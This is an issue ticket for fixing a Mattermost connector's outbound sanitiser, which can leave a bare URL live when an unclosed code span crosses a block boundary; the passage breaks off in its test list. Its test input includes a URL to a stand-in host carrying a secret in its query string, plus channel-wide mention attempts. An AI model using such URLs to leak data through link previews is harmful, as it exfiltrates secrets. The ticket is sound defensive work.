# FIX-182: The Mattermost outbound pipeline can leave a live bare URL (an inline code span crossing a block boundary)

## Goal
Security-relevant (D-270 link previews / data exfiltration; FIX-142's outbound pipeline). Found by the CI
Watcher (2026-11-19) in CI run 44535701452, shard rust-test 3:
`connectors/mattermost/tests/hostile_pipeline.rs:343`
`hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts` → "a bare URL is left (the
server would fetch it)". Minimal input:

```
<div>
![x](https://e.example/?d=S)
</div> <code> see https://e.example/?d=SECRET now > [!NOTE]
> n <code>@channel</code> <kbd>@all</kbd> <pre>@here</pre>
```

Output: `\!\[x\]\(…\)\n\n ` see https://e.example/?d=SECRET now > [!NOTE]\n> n @​channel` `@​all` …`.
Cause (CI Watcher's reading, confirm it): the unclosed `<code>` becomes a backtick span meant to cover
the URL, but the next line starts with `> `, which ends the paragraph (a blockquote), so the span never
closes and the URL is plain text the Mattermost server unfurls — an agent-controlled URL with data in its
query fetched by the server.

Proptest seed `cc 02af42e08582e5bf29b382e7fc82c98233a4c79d548c2021b8b480c154b35712` for
`connectors/mattermost/tests/hostile_pipeline.proptest-regressions` — commit it **with** the fix (it fails
CI at random until then).

## Change
An inline code span never spans a block boundary: close it before any line break that could start a new
block (or escape/break the URL inside it as D-270 does for URLs outside code), and make the bare-URL
neutralisation run on whatever is not inside a *closed* span. Prefer the fix that keeps D-270's invariant
independent of how a span ends: "no bare `http(s)://` survives outside a closed code span". Check the
other block starters (`#`, `-`, `*`, `1.`, `|`, fences, setext underlines, `>`) and the other connectors
that share the pipeline (`aurora-channels`), not only `>`. Never weaken a check to make the property pass.

## Tests
- The seed as a committed regression case, seen failing first.
- Unit tests: an unclosed `<code>` followed by each block starter, with a URL inside — no bare URL in the
  output; an ordinary closed span is unchanged.
- Gate (targeted, owner 2026-11-19): the `hostile_pipeline` tests and proptest once with a raised case
  count (`PROPTEST_CASES=20000`), the `aurora-channels`/sanitize tests of the touched code, clippy on the
